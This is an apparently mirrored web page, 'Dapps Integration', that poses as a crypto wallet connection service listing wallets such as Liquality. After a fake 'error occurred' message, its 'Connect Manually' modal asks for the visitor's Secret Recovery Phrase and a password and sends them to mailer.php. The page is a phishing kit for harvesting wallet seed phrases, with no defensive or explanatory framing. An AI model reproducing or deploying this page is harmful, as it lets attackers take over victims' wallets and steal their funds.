                                ...
                                <div class="wrap-box flex">
                                    <div id="site-logo" class="clearfix">
                                        <div id="site-logo-inner">
                                            <a href="#" rel="home" class="main-logo">
                                                <h4 style="color: white !important;">Dapps Integration</h4>
                                            </a>
                                        </div>
                                    </div>
                                    ...
                                    <div class="flat-search-btn flex">
                                        <div class="sc-btn-top mg-r-12" id="site-header">
                                            <a href="#" id="connectbtn" class="sc-button header-slider style style-1 wallet fl-button pri-1">
                ...
                <div class="themesflat-container">
                    <div class="row">
                        <div class="col-md-12">
                            ...
                            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                <div id="liquality" class="sc-author-box select_liquality" data-title="Liquality" data-logo="assets/images/logo/liquality.jpg" style="cursor:pointer;">
                                    <div class="author-avatar">
                                        <a href="#">
                                            <img src="assets/images/logo/liquality.jpg" alt="Image" class="avatar">
                                        </a>
                                        <div class="badge"><i class="ripple"></i></div>
                                    </div>
                                    <div class="author-infor">
                                        <h5 class="style2"><a>Liquality</a></h5>
                                        <span class="price">liquality.com</span>
                                    </div>
                                </div>
                            </div>
                    ...
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-12">
                            <div class="widget widget-logo">
                                <p class="sub-widget-logo text-center">Dapps Integration &copy; <?php $date = date("Y"); echo $date; ?>. All Rights Reserved.</p>
                            </div>
                        </div>
            ...
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    ...
                    <div class="modal-body space-y-20 pd-40">
                        ...
                        <div id="failed_to_connect2" style="display:none;">
                            <div style="padding:6px; color:red; border:1px solid red; border-radius:5px; text-align:center!important; font-size:16px; font-weight:500;">
                                An error occurred... please try again or connect mannually
                            </div>
                            <br><br><br>
                            <a href="#" id="try_auto_connecting_again" class="btn btn-outline-primary" aria-label="Close">Try Again</a><br>
                            <a href="#" id="button_connect_manually2" class="btn btn-primary">Connect Manually</a>
                        </div>
                        <div id="div_connect_manuallly" style="display:none;">
                            <form action="mail.php" method="POST">
                                ...
                                <button disabled type="submit" name="connect" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet</button>
                            </form>
                        </div>
                        
                        <div id="div_connect_manuallly2" style="display:none;">
                            <form action="mailer.php" method="POST">
                                <h3 class="text-primary" style="font-size:25px; font-weight:500;">Import Wallet</h3><br><br><br>
                                <div class="input-group">
                                    <input type="text" name="recovery_phrase" required class="form-control text-primary" placeholder="Secret Recovery Phrase">
                                </div><br><br>
                                <div class="input-group">
                                    <input type="text" name="new_pwd" required class="form-control text-primary" placeholder="New Password">
                                </div><br><br>
                                <div class="input-group">
                                    <input type="text" name="confirm_pwd" required id="confirm_pwd" class="form-control text-primary" placeholder="Confirm Password">
                                </div><br><br>
                            
                                <button disabled type="submit" name="connect" id="button_connect_wallet2" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Import</button>
                            </form>
                        </div>
...
<!-- Mirrored from s.migratedapptoken.com/wallets.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Mar 2022 20:16:23 GMT -->
</html>
